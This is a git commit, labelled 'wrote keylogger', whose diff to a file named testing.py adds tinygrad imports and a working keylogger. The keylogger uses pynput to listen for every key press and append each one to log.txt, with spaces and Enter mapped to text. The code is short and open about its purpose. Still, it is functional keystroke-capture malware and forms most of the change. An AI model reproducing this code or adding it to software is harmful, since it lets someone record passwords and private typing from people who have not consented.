fae10b4543878a2fdfe90684c0bcfbf107473bf1
Brandon Davis <brandon.davis9@gmail.com>
2023-08-10 17:53:31 -0400

    wrote keylogger

--- testing.py
+++ testing.py
@@ -1,2 +1,23 @@
+#%%
 import numpy as n
-import tinygrad
+from tinygrad.tensor import Tensor
+from tinygrad.nn import Conv2d
+from pynput.keyboard import Listener
+# %%
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+
+    if key == 'Key.space':
+        key = ' '
+    if key == 'Key.shift_r':
+        key = ''
+    if key == "Key.enter":
+        key = '\n'
+
+    with open("log.txt", 'a') as f:
+        f.write(key)
+
+with Listener(on_press=log_keystroke) as l:
+    l.join()
+
+
